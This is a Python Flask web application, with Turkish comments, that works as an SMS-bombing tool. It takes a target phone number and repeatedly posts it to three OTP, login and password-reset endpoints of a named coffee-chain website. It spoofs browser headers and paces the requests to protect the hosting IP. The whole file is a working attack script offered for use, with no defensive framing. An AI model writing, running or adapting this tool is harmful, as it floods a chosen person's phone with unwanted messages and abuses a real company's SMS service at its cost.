import os, requests, time, threading, random
from flask import Flask, render_template_string, request, redirect, url_for

app = Flask(__name__)
state = {"phone": "", "logs": [], "active": False, "success_count": 0}

# İstek atılacak farklı kapılar
ENDPOINTS = [
    {"url": "https://www.kahvedunyasi.com/api/v1/auth/register-otp", "type": "KAYIT"},
    {"url": "https://api.kahvedunyasi.com/v1/login/otp", "type": "GİRİŞ"},
    {"url": "https://www.kahvedunyasi.com/api/v1/auth/forgot-password", "type": "ŞİFRE-UNUT"}
]

def write_log(msg):
    tm = time.strftime('%H:%M:%S')
    state["logs"].insert(0, f"[{tm}] {msg}")
    if len(state["logs"]) > 15: state["logs"].pop()
    print(f">>> {tm} - {msg}", flush=True)

def worker():
    session = requests.Session()
    while True:
        if state["active"] and state["phone"]:
            # Her döngüde farklı bir API ucunu seç
            job = random.choice(ENDPOINTS)
            
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
                "Referer": "https://www.kahvedunyasi.com/",
                "X-Requested-With": "XMLHttpRequest"
            }
            
            # API'ye göre payload yapısını ayarla
            if job["type"] == "KAYIT":
                payload = {"mobile_number": state["phone"], "country_code": "90"}
            else:
                payload = {"mobile_number": state["phone"]}

            try:
                # Önce çerez için ana sayfaya uğra
                session.get("https://www.kahvedunyasi.com/", timeout=5)
                
                # İsteği gönder
                res = session.post(job["url"], json=payload, headers=headers, timeout=10)
                
                if res.status_code in [200, 201]:
                    state["success_count"] += 1
                    write_log(f"{job['type']} Başarılı ✅")
                elif res.status_code == 302:
                    write_log(f"{job['type']} -> 302 (Yönlendirildi) 🛡️")
                else:
                    write_log(f"{job['type']} -> Hata: {res.status_code}")
            except:
                write_log("Bağlantı Sorunu ⚠️")
        
        # Render IP'sini korumak için bekleme süresi
        time.sleep(110)

threading.Thread(target=worker, daemon=True).start()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        action = request.form.get('action')
        if action == "start":
            p = request.form.get('phone', '').strip()
            if len(p) == 10:
                state["phone"] = p
                state["active"] = True
                write_log(f"Hedef: {p} başlatıldı.")
        else:
            state["active"] = False
            write_log("Sistem durduruldu.")
        return redirect(url_for('index'))

    return render_template_string("""
        <body style="background:#020617; color:#f8fafc; font-family:sans-serif; text-align:center; padding-top:40px;">
            <div style="display:inline-block; background:#0f172a; padding:25px; border-radius:15px; border:1px solid #1e293b; width:340px;">
                <h2 style="color:#38bdf8; margin:0;">SMS MULTI-API</h2>
                <p style="font-size:12px; color:#64748b;">Toplam Başarılı: {{ sc }}</p>
                <div style="margin-bottom:15px; font-weight:bold; color:{{ 'lime' if a else 'red' }}">
                    {{ 'ÇALIŞIYOR' if a else 'DURDU' }}
                </div>
                <form method="POST">
                    <input name="phone" placeholder="5XXXXXXXXX" value="{{p}}" maxlength="10" style="padding:12px; border-radius:8px; border:1px solid #334155; background:#020617; color:#22c55e; font-size:18px; text-align:center; width:100%; box-sizing:border-box;"><br><br>
                    <div style="display:flex; gap:10px;">
                        <button name="action" value="start" style="flex:1; padding:12px; background:#0ea5e9; color:white; border:none; border-radius:8px; cursor:pointer; font-weight:bold;">BAŞLAT</button>
                        <button name="action" value="stop" style="flex:1; padding:12px; background:#64748b; color:white; border:none; border-radius:8px; cursor:pointer; font-weight:bold;">DUR</button>
                    </div>
                </form>
                <div style="margin-top:20px; background:#000; color:#4ade80; padding:10px; border-radius:8px; height:180px; overflow-y:auto; text-align:left; font-family:monospace; font-size:11px; border:1px solid #1e293b;">
                    {% for l in logs %}<div>> {{l}}</div>{% endfor %}
                </div>
            </div>
            <script>setTimeout(()=> { if(document.activeElement.tagName != 'INPUT') location.reload(); }, 20000);</script>
        </body>
    """, p=state["phone"], logs=state["logs"], a=state["active"], sc=state["success_count"])

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
